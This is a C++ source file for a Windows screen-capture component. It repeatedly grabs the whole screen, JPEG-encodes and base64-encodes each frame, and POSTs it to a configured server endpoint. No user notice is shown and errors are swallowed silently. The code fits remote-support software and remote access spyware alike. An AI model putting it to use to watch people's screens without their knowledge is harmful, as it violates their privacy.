#include "ScreenCapture.h"
#include "../network/http_client.h"
#include "../helpers/constants.h"
#include <gdiplus.h>
#include <iostream>

#pragma comment(lib, "gdiplus.lib")

static ULONG_PTR gdiplusToken = 0;
static bool gdiplusInitialized = false;

static void InitGdiPlus() {
    if (!gdiplusInitialized) {
        Gdiplus::GdiplusStartupInput input;
        Gdiplus::GdiplusStartup(&gdiplusToken, &input, nullptr);
        gdiplusInitialized = true;
    }
}

static int GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
    UINT num = 0, size = 0;
    Gdiplus::GetImageEncodersSize(&num, &size);
    if (size == 0) return -1;

    auto pImageCodecInfo = (Gdiplus::ImageCodecInfo*)(malloc(size));
    if (!pImageCodecInfo) return -1;

    Gdiplus::GetImageEncoders(num, size, pImageCodecInfo);
    for (UINT i = 0; i < num; ++i) {
        if (wcscmp(pImageCodecInfo[i].MimeType, format) == 0) {
            *pClsid = pImageCodecInfo[i].Clsid;
            free(pImageCodecInfo);
            return i;
        }
    }
    free(pImageCodecInfo);
    return -1;
}

ScreenCapture::ScreenCapture(const std::string& connectionId, int intervalMs)
    : _connectionId(connectionId), _intervalMs(intervalMs), _running(false) {
    InitGdiPlus();
}

ScreenCapture::~ScreenCapture() {
    Stop();
}

void ScreenCapture::Start() {
    if (_running) return;
    _running = true;
    _thread = std::thread(&ScreenCapture::CaptureLoop, this);
}

void ScreenCapture::Stop() {
    _running = false;
    if (_thread.joinable()) {
        _thread.join();
    }
}

bool ScreenCapture::IsRunning() const {
    return _running;
}

std::vector<BYTE> ScreenCapture::CaptureScreen(int quality) {
    std::vector<BYTE> result;

    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);

    HDC hScreenDC = GetDC(nullptr);
    HDC hMemDC = CreateCompatibleDC(hScreenDC);
    HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, screenWidth, screenHeight);
    SelectObject(hMemDC, hBitmap);

    BitBlt(hMemDC, 0, 0, screenWidth, screenHeight, hScreenDC, 0, 0, SRCCOPY);

    Gdiplus::Bitmap bitmap(hBitmap, nullptr);

    CLSID jpegClsid;
    if (GetEncoderClsid(L"image/jpeg", &jpegClsid) < 0) {
        DeleteObject(hBitmap);
        DeleteDC(hMemDC);
        ReleaseDC(nullptr, hScreenDC);
        return result;
    }

    Gdiplus::EncoderParameters encoderParams;
    encoderParams.Count = 1;
    encoderParams.Parameter[0].Guid = Gdiplus::EncoderQuality;
    encoderParams.Parameter[0].Type = Gdiplus::EncoderParameterValueTypeLong;
    encoderParams.Parameter[0].NumberOfValues = 1;
    ULONG qualityValue = (ULONG)quality;
    encoderParams.Parameter[0].Value = &qualityValue;

    IStream* pStream = nullptr;
    CreateStreamOnHGlobal(nullptr, TRUE, &pStream);

    if (bitmap.Save(pStream, &jpegClsid, &encoderParams) == Gdiplus::Ok) {
        STATSTG stat;
        pStream->Stat(&stat, STATFLAG_NONAME);
        ULONG size = (ULONG)stat.cbSize.QuadPart;

        result.resize(size);
        LARGE_INTEGER li = {};
        pStream->Seek(li, STREAM_SEEK_SET, nullptr);
        ULONG bytesRead = 0;
        pStream->Read(result.data(), size, &bytesRead);
    }

    if (pStream) pStream->Release();
    DeleteObject(hBitmap);
    DeleteDC(hMemDC);
    ReleaseDC(nullptr, hScreenDC);

    return result;
}

std::string ScreenCapture::ToBase64(const std::vector<BYTE>& data) {
    static const char table[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    std::string encoded;
    size_t len = data.size();
    encoded.reserve(((len + 2) / 3) * 4);

    for (size_t i = 0; i < len; i += 3) {
        unsigned int b = (data[i] << 16);
        if (i + 1 < len) b |= (data[i + 1] << 8);
        if (i + 2 < len) b |= data[i + 2];

        encoded.push_back(table[(b >> 18) & 0x3F]);
        encoded.push_back(table[(b >> 12) & 0x3F]);
        encoded.push_back((i + 1 < len) ? table[(b >> 6) & 0x3F] : '=');
        encoded.push_back((i + 2 < len) ? table[b & 0x3F] : '=');
    }

    return encoded;
}

void ScreenCapture::CaptureLoop() {
    while (_running) {
        try {
            auto imageData = CaptureScreen(40);
            if (!imageData.empty()) {
                std::string base64 = ToBase64(imageData);
                std::string json = "{\"connectionId\":\"" + _connectionId + "\",\"frame\":\"" + base64 + "\"}";
                std::string url = Constants::API_BASE + "/connections/" + _connectionId + "/screen";
                HttpClient::Post(url, json);
            }
        }
        catch (...) {}

        Sleep(_intervalMs);
    }
}
